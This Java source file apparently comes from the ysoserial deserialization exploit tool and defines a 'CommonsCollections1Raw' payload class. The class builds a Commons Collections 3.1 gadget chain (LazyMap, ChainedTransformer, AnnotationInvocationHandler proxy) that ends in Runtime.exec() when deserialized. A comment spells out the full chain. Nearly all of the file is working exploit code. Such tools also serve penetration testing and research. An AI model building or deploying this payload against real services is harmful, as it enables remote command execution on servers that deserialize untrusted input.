package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class CommonsCollections1Raw extends PayloadRunner implements ObjectPayloadRaw<InvocationHandler> {
	
	public InvocationHandler getObject(final Object command) throws Exception {


		// inert chain for setup

		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });

		// real chain for after setup
		final Transformer[] transformers = (Transformer[]) command;

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
